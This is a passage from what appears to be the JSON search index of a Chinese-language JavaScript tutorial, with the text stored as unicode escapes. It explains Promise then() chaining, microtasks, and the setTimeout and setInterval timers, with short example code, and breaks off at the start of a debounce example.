\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u5f02\u6b65\u64cd\u4f5c\u6210\u529f\u65f6\uff08\u53d8\u4e3a fulfilled \u72b6\u6001\uff09\u7684\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5f02\u6b65\u64cd\u4f5c\u5931\u8d25\uff08\u53d8\u4e3a rejected \uff09\u65f6\u7684\u56de\u8c03\u51fd\u6570\uff08\u8be5\u53c2\u6570\u53ef\u4ee5\u7701\u7565\uff09\u3002\u4e00\u65e6\u72b6\u6001\u6539\u53d8\uff0c\u5c31\u8c03\u7528\u76f8\u5e94\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 var p1 = new Promise ( function ( resolve , reject ) { resolve ( '\u6210\u529f' ); }); p1 . then ( console . log , console . error ); // \"\u6210\u529f\" var p2 = new Promise ( function ( resolve , reject ) { reject ( new Error ( '\u5931\u8d25' )); }); p2 . then ( console . log , console . error ); // Error: \u5931\u8d25 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p1 \u548c p2 \u90fd\u662fPromise \u5b9e\u4f8b\uff0c\u5b83\u4eec\u7684 then \u65b9\u6cd5\u7ed1\u5b9a\u4e24\u4e2a\u56de\u8c03\u51fd\u6570\uff1a\u6210\u529f\u65f6\u7684\u56de\u8c03\u51fd\u6570 console.log \uff0c\u5931\u8d25\u65f6\u7684\u56de\u8c03\u51fd\u6570 console.error \uff08\u53ef\u4ee5\u7701\u7565\uff09\u3002 p1 \u7684\u72b6\u6001\u53d8\u4e3a\u6210\u529f\uff0c p2 \u7684\u72b6\u6001\u53d8\u4e3a\u5931\u8d25\uff0c\u5bf9\u5e94\u7684\u56de\u8c03\u51fd\u6570\u4f1a\u6536\u5230\u5f02\u6b65\u64cd\u4f5c\u4f20\u56de\u7684\u503c\uff0c\u7136\u540e\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u3002 then \u65b9\u6cd5\u53ef\u4ee5\u94fe\u5f0f\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 p1 . then ( step1 ) . then ( step2 ) . then ( step3 ) . then ( console . log , console . error ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p1 \u540e\u9762\u6709\u56db\u4e2a then \uff0c\u610f\u5473\u4f9d\u6b21\u6709\u56db\u4e2a\u56de\u8c03\u51fd\u6570\u3002\u53ea\u8981\u524d\u4e00\u6b65\u7684\u72b6\u6001\u53d8\u4e3a fulfilled \uff0c\u5c31\u4f1a\u4f9d\u6b21\u6267\u884c\u7d27\u8ddf\u5728\u540e\u9762\u7684\u56de\u8c03\u51fd\u6570\u3002 \u6700\u540e\u4e00\u4e2a then \u65b9\u6cd5\uff0c\u56de\u8c03\u51fd\u6570\u662f console.log \u548c console.error \uff0c\u7528\u6cd5\u4e0a\u6709\u4e00\u70b9\u91cd\u8981\u7684\u533a\u522b\u3002 console.log \u53ea\u663e\u793a step3 \u7684\u8fd4\u56de\u503c\uff0c\u800c console.error \u53ef\u4ee5\u663e\u793a p1 \u3001 step1 \u3001 step2 \u3001 step3 \u4e4b\u4e2d\u4efb\u610f\u4e00\u4e2a\u53d1\u751f\u7684\u9519\u8bef\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c step1 \u7684\u72b6\u6001\u53d8\u4e3a rejected \uff0c\u90a3\u4e48 step2 \u548c step3 \u90fd\u4e0d\u4f1a\u6267\u884c\u4e86\uff08\u56e0\u4e3a\u5b83\u4eec\u662f resolved \u7684\u56de\u8c03\u51fd\u6570\uff09\u3002Promise \u5f00\u59cb\u5bfb\u627e\uff0c\u63a5\u4e0b\u6765\u7b2c\u4e00\u4e2a\u4e3a rejected \u7684\u56de\u8c03\u51fd\u6570\uff0c\u5728\u4e0a\u9762\u4ee3\u7801\u4e2d\u662f console.error \u3002\u8fd9\u5c31\u662f\u8bf4\uff0cPromise \u5bf9\u8c61\u7684\u62a5\u9519\u5177\u6709\u4f20\u9012\u6027\u3002","title":"Promise.prototype.then()"},{"location":"async/promise/#then","text":"Promise \u7684\u7528\u6cd5\uff0c\u7b80\u5355\u8bf4\u5c31\u662f\u4e00\u53e5\u8bdd\uff1a\u4f7f\u7528 then \u65b9\u6cd5\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u3002\u4f46\u662f\uff0c\u4e0d\u540c\u7684\u5199\u6cd5\u6709\u4e00\u4e9b\u7ec6\u5fae\u7684\u5dee\u522b\uff0c\u8bf7\u770b\u4e0b\u9762\u56db\u79cd\u5199\u6cd5\uff0c\u5b83\u4eec\u7684\u5dee\u522b\u5728\u54ea\u91cc\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // \u5199\u6cd5\u4e00 f1 (). then ( function () { return f2 (); }); // \u5199\u6cd5\u4e8c f1 (). then ( function () { f2 (); }); // \u5199\u6cd5\u4e09 f1 (). then ( f2 ()); // \u5199\u6cd5\u56db f1 (). then ( f2 ); \u4e3a\u4e86\u4fbf\u4e8e\u8bb2\u89e3\uff0c\u4e0b\u9762\u8fd9\u56db\u79cd\u5199\u6cd5\u90fd\u518d\u7528 then \u65b9\u6cd5\u63a5\u4e00\u4e2a\u56de\u8c03\u51fd\u6570 f3 \u3002\u5199\u6cd5\u4e00\u7684 f3 \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\uff0c\u662f f2 \u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\u3002 1 2 3 f1 (). then ( function () { return f2 (); }). then ( f3 ); \u5199\u6cd5\u4e8c\u7684 f3 \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u662f undefined \u3002 1 2 3 4 f1 (). then ( function () { f2 (); return ; }). then ( f3 ); \u5199\u6cd5\u4e09\u7684 f3 \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\uff0c\u662f f2 \u51fd\u6570\u8fd4\u56de\u7684\u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\u3002 1 2 f1 (). then ( f2 ()) . then ( f3 ); \u5199\u6cd5\u56db\u4e0e\u5199\u6cd5\u4e00\u53ea\u6709\u4e00\u4e2a\u5dee\u522b\uff0c\u90a3\u5c31\u662f f2 \u4f1a\u63a5\u6536\u5230 f1() \u8fd4\u56de\u7684\u7ed3\u679c\u3002 1 2 f1 (). then ( f2 ) . then ( f3 );","title":"then() \u7528\u6cd5\u8fa8\u6790"},{"location":"async/promise/#_2","text":"\u4e0b\u9762\u662f\u4f7f\u7528 Promise \u5b8c\u6210\u56fe\u7247\u7684\u52a0\u8f7d\u3002 1 2 3 4 5 6 7 8 var preloadImage = function ( path ) { return new Promise ( function ( resolve , reject ) { var image = new Image (); image . onload = resolve ; image . onerror = reject ; image . src = path ; }); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c image \u662f\u4e00\u4e2a\u56fe\u7247\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5b83\u6709\u4e24\u4e2a\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\uff0c onload \u5c5e\u6027\u5728\u56fe\u7247\u52a0\u8f7d\u6210\u529f\u540e\u8c03\u7528\uff0c onerror \u5c5e\u6027\u5728\u52a0\u8f7d\u5931\u8d25\u8c03\u7528\u3002 \u4e0a\u9762\u7684 preloadImage() \u51fd\u6570\u7528\u6cd5\u5982\u4e0b\u3002 1 2 3 preloadImage ( 'https://example.com/my.jpg' ) . then ( function ( e ) { document . body . append ( e . target ) }) . then ( function () { console . log ( '\u52a0\u8f7d\u6210\u529f' ) }) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56fe\u7247\u52a0\u8f7d\u6210\u529f\u4ee5\u540e\uff0c onload \u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u56e0\u6b64\u7b2c\u4e00\u4e2a then() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u63a5\u6536\u5230\u8fd9\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u7684 target \u5c5e\u6027\u5c31\u662f\u56fe\u7247\u52a0\u8f7d\u540e\u751f\u6210\u7684 DOM \u8282\u70b9\u3002","title":"\u5b9e\u4f8b\uff1a\u56fe\u7247\u52a0\u8f7d"},{"location":"async/promise/#_3","text":"Promise \u7684\u4f18\u70b9\u5728\u4e8e\uff0c\u8ba9\u56de\u8c03\u51fd\u6570\u53d8\u6210\u4e86\u89c4\u8303\u7684\u94fe\u5f0f\u5199\u6cd5\uff0c\u7a0b\u5e8f\u6d41\u7a0b\u53ef\u4ee5\u770b\u5f97\u5f88\u6e05\u695a\u3002\u5b83\u6709\u4e00\u6574\u5957\u63a5\u53e3\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8bb8\u591a\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u540c\u65f6\u6267\u884c\u591a\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u7b49\u5230\u5b83\u4eec\u7684\u72b6\u6001\u90fd\u6539\u53d8\u4ee5\u540e\uff0c\u518d\u6267\u884c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff1b\u518d\u6bd4\u5982\uff0c\u4e3a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u4e2d\u629b\u51fa\u7684\u9519\u8bef\uff0c\u7edf\u4e00\u6307\u5b9a\u5904\u7406\u65b9\u6cd5\u7b49\u7b49\u3002 \u800c\u4e14\uff0cPromise \u8fd8\u6709\u4e00\u4e2a\u4f20\u7edf\u5199\u6cd5\u6ca1\u6709\u7684\u597d\u5904\uff1a\u5b83\u7684\u72b6\u6001\u4e00\u65e6\u6539\u53d8\uff0c\u65e0\u8bba\u4f55\u65f6\u67e5\u8be2\uff0c\u90fd\u80fd\u5f97\u5230\u8fd9\u4e2a\u72b6\u6001\u3002\u8fd9\u610f\u5473\u7740\uff0c\u65e0\u8bba\u4f55\u65f6\u4e3a Promise \u5b9e\u4f8b\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u90fd\u80fd\u6b63\u786e\u6267\u884c\u3002\u6240\u4ee5\uff0c\u4f60\u4e0d\u7528\u62c5\u5fc3\u662f\u5426\u9519\u8fc7\u4e86\u67d0\u4e2a\u4e8b\u4ef6\u6216\u4fe1\u53f7\u3002\u5982\u679c\u662f\u4f20\u7edf\u5199\u6cd5\uff0c\u901a\u8fc7\u76d1\u542c\u4e8b\u4ef6\u6765\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u4e00\u65e6\u9519\u8fc7\u4e86\u4e8b\u4ef6\uff0c\u518d\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u662f\u4e0d\u4f1a\u6267\u884c\u7684\u3002 Promise \u7684\u7f3a\u70b9\u662f\uff0c\u7f16\u5199\u7684\u96be\u5ea6\u6bd4\u4f20\u7edf\u5199\u6cd5\u9ad8\uff0c\u800c\u4e14\u9605\u8bfb\u4ee3\u7801\u4e5f\u4e0d\u662f\u4e00\u773c\u53ef\u4ee5\u770b\u61c2\u3002\u4f60\u53ea\u4f1a\u770b\u5230\u4e00\u5806 then \uff0c\u5fc5\u987b\u81ea\u5df1\u5728 then \u7684\u56de\u8c03\u51fd\u6570\u91cc\u9762\u7406\u6e05\u903b\u8f91\u3002","title":"\u5c0f\u7ed3"},{"location":"async/promise/#_4","text":"Promise \u7684\u56de\u8c03\u51fd\u6570\u5c5e\u4e8e\u5f02\u6b65\u4efb\u52a1\uff0c\u4f1a\u5728\u540c\u6b65\u4efb\u52a1\u4e4b\u540e\u6267\u884c\u3002 1 2 3 4 5 6 7 new Promise ( function ( resolve , reject ) { resolve ( 1 ); }). then ( console . log ); console . log ( 2 ); // 2 // 1 \u4e0a\u9762\u4ee3\u7801\u4f1a\u5148\u8f93\u51fa2\uff0c\u518d\u8f93\u51fa1\u3002\u56e0\u4e3a console.log(2) \u662f\u540c\u6b65\u4efb\u52a1\uff0c\u800c then \u7684\u56de\u8c03\u51fd\u6570\u5c5e\u4e8e\u5f02\u6b65\u4efb\u52a1\uff0c\u4e00\u5b9a\u665a\u4e8e\u540c\u6b65\u4efb\u52a1\u6267\u884c\u3002 \u4f46\u662f\uff0cPromise \u7684\u56de\u8c03\u51fd\u6570\u4e0d\u662f\u6b63\u5e38\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u800c\u662f\u5fae\u4efb\u52a1\uff08microtask\uff09\u3002\u5b83\u4eec\u7684\u533a\u522b\u5728\u4e8e\uff0c\u6b63\u5e38\u4efb\u52a1\u8ffd\u52a0\u5230\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\uff0c\u5fae\u4efb\u52a1\u8ffd\u52a0\u5230\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5fae\u4efb\u52a1\u7684\u6267\u884c\u65f6\u95f4\u4e00\u5b9a\u65e9\u4e8e\u6b63\u5e38\u4efb\u52a1\u3002 1 2 3 4 5 6 7 8 9 10 11 12 setTimeout ( function () { console . log ( 1 ); }, 0 ); new Promise ( function ( resolve , reject ) { resolve ( 2 ); }). then ( console . log ); console . log ( 3 ); // 3 // 2 // 1 \u4e0a\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u662f 321 \u3002\u8fd9\u8bf4\u660e then \u7684\u56de\u8c03\u51fd\u6570\u7684\u6267\u884c\u65f6\u95f4\uff0c\u65e9\u4e8e setTimeout(fn, 0) \u3002\u56e0\u4e3a then \u662f\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u6267\u884c\uff0c setTimeout(fn, 0) \u5728\u4e0b\u4e00\u8f6e\u4e8b\u4ef6\u5faa\u73af\u5f00\u59cb\u65f6\u6267\u884c\u3002","title":"\u5fae\u4efb\u52a1"},{"location":"async/promise/#_5","text":"Sebastian Porto, Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises Rhys Brett-Bowen, Promises/A+ - understanding the spec through implementation Matt Podwysocki, Amanda Silver, Asynchronous Programming in JavaScript with \u201cPromises\u201d Marc Harter, Promise A+ Implementation Bryan Klimt, What\u2019s so great about JavaScript Promises? Jake Archibald, JavaScript Promises There and back again Mikito Takada, 7. Control flow, Mixu's Node book","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"async/timer/","text":"\u5b9a\u65f6\u5668 \u00b6 JavaScript \u63d0\u4f9b\u5b9a\u65f6\u6267\u884c\u4ee3\u7801\u7684\u529f\u80fd\uff0c\u53eb\u505a\u5b9a\u65f6\u5668\uff08timer\uff09\uff0c\u4e3b\u8981\u7531 setTimeout() \u548c setInterval() \u8fd9\u4e24\u4e2a\u51fd\u6570\u6765\u5b8c\u6210\u3002\u5b83\u4eec\u5411\u4efb\u52a1\u961f\u5217\u6dfb\u52a0\u5b9a\u65f6\u4efb\u52a1\u3002 setTimeout() \u00b6 setTimeout \u51fd\u6570\u7528\u6765\u6307\u5b9a\u67d0\u4e2a\u51fd\u6570\u6216\u67d0\u6bb5\u4ee3\u7801\uff0c\u5728\u591a\u5c11\u6beb\u79d2\u4e4b\u540e\u6267\u884c\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5b9a\u65f6\u5668\u7684\u7f16\u53f7\uff0c\u4ee5\u540e\u53ef\u4ee5\u7528\u6765\u53d6\u6d88\u8fd9\u4e2a\u5b9a\u65f6\u5668\u3002 1 var timerId = setTimeout ( func | code , delay ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setTimeout \u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 func|code \u662f\u5c06\u8981\u63a8\u8fdf\u6267\u884c\u7684\u51fd\u6570\u540d\u6216\u8005\u4e00\u6bb5\u4ee3\u7801\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 delay \u662f\u63a8\u8fdf\u6267\u884c\u7684\u6beb\u79d2\u6570\u3002 1 2 3 4 5 6 console . log ( 1 ); setTimeout ( 'console.log(2)' , 1000 ); console . log ( 3 ); // 1 // 3 // 2 \u4e0a\u9762\u4ee3\u7801\u4f1a\u5148\u8f93\u51fa1\u548c3\uff0c\u7136\u540e\u7b49\u5f851000\u6beb\u79d2\u518d\u8f93\u51fa2\u3002\u6ce8\u610f\uff0c console.log(2) \u5fc5\u987b\u4ee5\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\uff0c\u4f5c\u4e3a setTimeout \u7684\u53c2\u6570\u3002 \u5982\u679c\u63a8\u8fdf\u6267\u884c\u7684\u662f\u51fd\u6570\uff0c\u5c31\u76f4\u63a5\u5c06\u51fd\u6570\u540d\uff0c\u4f5c\u4e3a setTimeout \u7684\u53c2\u6570\u3002 1 2 3 4 5 function f () { console . log ( 2 ); } setTimeout ( f , 1000 ); setTimeout \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5982\u679c\u7701\u7565\uff0c\u5219\u9ed8\u8ba4\u4e3a0\u3002 1 2 3 setTimeout ( f ) // \u7b49\u540c\u4e8e setTimeout ( f , 0 ) \u9664\u4e86\u524d\u4e24\u4e2a\u53c2\u6570\uff0c setTimeout \u8fd8\u5141\u8bb8\u66f4\u591a\u7684\u53c2\u6570\u3002\u5b83\u4eec\u5c06\u4f9d\u6b21\u4f20\u5165\u63a8\u8fdf\u6267\u884c\u7684\u51fd\u6570\uff08\u56de\u8c03\u51fd\u6570\uff09\u3002 1 2 3 setTimeout ( function ( a , b ) { console . log ( a + b ); }, 1000 , 1 , 1 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setTimeout \u5171\u67094\u4e2a\u53c2\u6570\u3002\u6700\u540e\u90a3\u4e24\u4e2a\u53c2\u6570\uff0c\u5c06\u57281000\u6beb\u79d2\u4e4b\u540e\u56de\u8c03\u51fd\u6570\u6267\u884c\u65f6\uff0c\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u3002 \u8fd8\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff0c\u5982\u679c\u56de\u8c03\u51fd\u6570\u662f\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u90a3\u4e48 setTimeout \u4f7f\u5f97\u65b9\u6cd5\u5185\u90e8\u7684 this \u5173\u952e\u5b57\u6307\u5411\u5168\u5c40\u73af\u5883\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u65f6\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 var x = 1 ; var obj = { x : 2 , y : function () { console . log ( this . x ); } }; setTimeout ( obj . y , 1000 ) // 1 \u4e0a\u9762\u4ee3\u7801\u8f93\u51fa\u7684\u662f1\uff0c\u800c\u4e0d\u662f2\u3002\u56e0\u4e3a\u5f53 obj.y \u57281000\u6beb\u79d2\u540e\u8fd0\u884c\u65f6\uff0c this \u6240\u6307\u5411\u7684\u5df2\u7ecf\u4e0d\u662f obj \u4e86\uff0c\u800c\u662f\u5168\u5c40\u73af\u5883\u3002 \u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06 obj.y \u653e\u5165\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var x = 1 ; var obj = { x : 2 , y : function () { console . log ( this . x ); } }; setTimeout ( function () { obj . y (); }, 1000 ); // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.y \u653e\u5728\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u4e4b\u4e2d\uff0c\u8fd9\u4f7f\u5f97 obj.y \u5728 obj \u7684\u4f5c\u7528\u57df\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5728\u5168\u5c40\u4f5c\u7528\u57df\u5185\u6267\u884c\uff0c\u6240\u4ee5\u80fd\u591f\u663e\u793a\u6b63\u786e\u7684\u503c\u3002 \u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528 bind \u65b9\u6cd5\uff0c\u5c06 obj.y \u8fd9\u4e2a\u65b9\u6cd5\u7ed1\u5b9a\u5728 obj \u4e0a\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 var x = 1 ; var obj = { x : 2 , y : function () { console . log ( this . x ); } }; setTimeout ( obj . y . bind ( obj ), 1000 ) // 2 setInterval() \u00b6 setInterval \u51fd\u6570\u7684\u7528\u6cd5\u4e0e setTimeout \u5b8c\u5168\u4e00\u81f4\uff0c\u533a\u522b\u4ec5\u4ec5\u5728\u4e8e setInterval \u6307\u5b9a\u67d0\u4e2a\u4efb\u52a1\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u5c31\u6267\u884c\u4e00\u6b21\uff0c\u4e5f\u5c31\u662f\u65e0\u9650\u6b21\u7684\u5b9a\u65f6\u6267\u884c\u3002 1 2 3 4 var i = 1 var timer = setInterval ( function () { console . log ( 2 ); }, 1000 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u96941000\u6beb\u79d2\u5c31\u8f93\u51fa\u4e00\u4e2a2\uff0c\u4f1a\u65e0\u9650\u8fd0\u884c\u4e0b\u53bb\uff0c\u76f4\u5230\u5173\u95ed\u5f53\u524d\u7a97\u53e3\u3002 \u4e0e setTimeout \u4e00\u6837\uff0c\u9664\u4e86\u524d\u4e24\u4e2a\u53c2\u6570\uff0c setInterval \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u66f4\u591a\u7684\u53c2\u6570\uff0c\u5b83\u4eec\u4f1a\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u901a\u8fc7 setInterval \u65b9\u6cd5\u5b9e\u73b0\u7f51\u9875\u52a8\u753b\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 var div = document . getElementById ( 'someDiv' ); var opacity = 1 ; var fader = setInterval ( function () { opacity -= 0.1 ; if ( opacity >= 0 ) { div . style . opacity = opacity ; } else { clearInterval ( fader ); } }, 100 ); \u4e0a\u9762\u4ee3\u7801\u6bcf\u9694100\u6beb\u79d2\uff0c\u8bbe\u7f6e\u4e00\u6b21 div \u5143\u7d20\u7684\u900f\u660e\u5ea6\uff0c\u76f4\u81f3\u5176\u5b8c\u5168\u900f\u660e\u4e3a\u6b62\u3002 setInterval \u7684\u4e00\u4e2a\u5e38\u89c1\u7528\u9014\u662f\u5b9e\u73b0\u8f6e\u8be2\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u8f6e\u8be2 URL \u7684 Hash \u503c\u662f\u5426\u53d1\u751f\u53d8\u5316\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 var hash = window . location . hash ; var hashWatcher = setInterval ( function () { if ( window . location . hash != hash ) { updatePage (); } }, 1000 ); setInterval \u6307\u5b9a\u7684\u662f\u201c\u5f00\u59cb\u6267\u884c\u201d\u4e4b\u95f4\u7684\u95f4\u9694\uff0c\u5e76\u4e0d\u8003\u8651\u6bcf\u6b21\u4efb\u52a1\u6267\u884c\u672c\u8eab\u6240\u6d88\u8017\u7684\u65f6\u95f4\u3002\u56e0\u6b64\u5b9e\u9645\u4e0a\uff0c\u4e24\u6b21\u6267\u884c\u4e4b\u95f4\u7684\u95f4\u9694\u4f1a\u5c0f\u4e8e\u6307\u5b9a\u7684\u65f6\u95f4\u3002\u6bd4\u5982\uff0c setInterval \u6307\u5b9a\u6bcf 100ms \u6267\u884c\u4e00\u6b21\uff0c\u6bcf\u6b21\u6267\u884c\u9700\u8981 5ms\uff0c\u90a3\u4e48\u7b2c\u4e00\u6b21\u6267\u884c\u7ed3\u675f\u540e95\u6beb\u79d2\uff0c\u7b2c\u4e8c\u6b21\u6267\u884c\u5c31\u4f1a\u5f00\u59cb\u3002\u5982\u679c\u67d0\u6b21\u6267\u884c\u8017\u65f6\u7279\u522b\u957f\uff0c\u6bd4\u5982\u9700\u8981105\u6beb\u79d2\uff0c\u90a3\u4e48\u5b83\u7ed3\u675f\u540e\uff0c\u4e0b\u4e00\u6b21\u6267\u884c\u5c31\u4f1a\u7acb\u5373\u5f00\u59cb\u3002 \u4e3a\u4e86\u786e\u4fdd\u4e24\u6b21\u6267\u884c\u4e4b\u95f4\u6709\u56fa\u5b9a\u7684\u95f4\u9694\uff0c\u53ef\u4ee5\u4e0d\u7528 setInterval \uff0c\u800c\u662f\u6bcf\u6b21\u6267\u884c\u7ed3\u675f\u540e\uff0c\u4f7f\u7528 setTimeout \u6307\u5b9a\u4e0b\u4e00\u6b21\u6267\u884c\u7684\u5177\u4f53\u65f6\u95f4\u3002 1 2 3 4 5 var i = 1 ; var timer = setTimeout ( function f () { // ... timer = setTimeout ( f , 2000 ); }, 2000 ); \u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u786e\u4fdd\uff0c\u4e0b\u4e00\u6b21\u6267\u884c\u603b\u662f\u5728\u672c\u6b21\u6267\u884c\u7ed3\u675f\u4e4b\u540e\u76842000\u6beb\u79d2\u5f00\u59cb\u3002 clearTimeout()\uff0cclearInterval() \u00b6 setTimeout \u548c setInterval \u51fd\u6570\uff0c\u90fd\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u8ba1\u6570\u5668\u7f16\u53f7\u3002\u5c06\u8be5\u6574\u6570\u4f20\u5165 clearTimeout \u548c clearInterval \u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u53d6\u6d88\u5bf9\u5e94\u7684\u5b9a\u65f6\u5668\u3002 1 2 3 4 5 var id1 = setTimeout ( f , 1000 ); var id2 = setInterval ( f , 1000 ); clearTimeout ( id1 ); clearInterval ( id2 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56de\u8c03\u51fd\u6570 f \u4e0d\u4f1a\u518d\u6267\u884c\u4e86\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5b9a\u65f6\u5668\u90fd\u88ab\u53d6\u6d88\u4e86\u3002 setTimeout \u548c setInterval \u8fd4\u56de\u7684\u6574\u6570\u503c\u662f\u8fde\u7eed\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e8c\u4e2a setTimeout \u65b9\u6cd5\u8fd4\u56de\u7684\u6574\u6570\u503c\uff0c\u5c06\u6bd4\u7b2c\u4e00\u4e2a\u7684\u6574\u6570\u503c\u59271\u3002 1 2 3 4 function f () {} setTimeout ( f , 1000 ) // 10 setTimeout ( f , 1000 ) // 11 setTimeout ( f , 1000 ) // 12 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fde\u7eed\u8c03\u7528\u4e09\u6b21 setTimeout \uff0c\u8fd4\u56de\u503c\u90fd\u6bd4\u4e0a\u4e00\u6b21\u5927\u4e861\u3002 \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u53d6\u6d88\u5f53\u524d\u6240\u6709\u7684 setTimeout \u5b9a\u65f6\u5668\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ( function () { // \u6bcf\u8f6e\u4e8b\u4ef6\u5faa\u73af\u68c0\u67e5\u4e00\u6b21 var gid = setInterval ( clearAllTimeouts , 0 ); function clearAllTimeouts () { var id = setTimeout ( function () {}, 0 ); while ( id > 0 ) { if ( id !== gid ) { clearTimeout ( id ); } id -- ; } } })(); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u8c03\u7528 setTimeout \uff0c\u5f97\u5230\u4e00\u4e2a\u8ba1\u7b97\u5668\u7f16\u53f7\uff0c\u7136\u540e\u628a\u7f16\u53f7\u6bd4\u5b83\u5c0f\u7684\u8ba1\u6570\u5668\u5168\u90e8\u53d6\u6d88\u3002 \u5b9e\u4f8b\uff1adebounce \u51fd\u6570 \u00b6 \u6709\u65f6\uff0c\u6211\u4eec\u4e0d\u5e0c\u671b\u56de\u8c03\u51fd\u6570\u88ab\u9891\u7e41\u8c03\u7528\u3002\u6bd4\u5982\uff0c\u7528\u6237\u586b\u5165\u7f51\u9875\u8f93\u5165\u6846\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u901a\u8fc7 Ajax \u65b9\u6cd5\u4f20\u56de\u670d\u52a1\u5668\uff0cjQuery \u7684\u5199\u6cd5\u5982\u4e0b\u3002 1 $ ( 'textarea' ). on ( 'keydown' , ajaxAction ); \u8fd9\u6837\u5199\u6709\u4e00\u4e2a\u5f88\u5927\u7684\u7f3a\u70b9\uff0c\u5c31\u662f\u5982\u679c\u7528\u6237\u8fde\u7eed\u51fb\u952e\uff0c\u5c31\u4f1a\u8fde\u7eed\u89e6\u53d1 keydown \u4e8b\u4ef6\uff0c\u9020\u6210\u5927\u91cf\u7684 Ajax \u901a\u4fe1\u3002\u8fd9\u662f\u4e0d\u5fc5\u8981\u7684\uff0c\u800c\u4e14\u5f88\u53ef\u80fd\u4ea7\u751f\u6027\u80fd\u95ee\u9898\u3002\u6b63\u786e\u7684\u505a\u6cd5\u5e94\u8be5\u662f\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u95e8\u69db\u503c\uff0c\u8868\u793a\u4e24\u6b21 Ajax 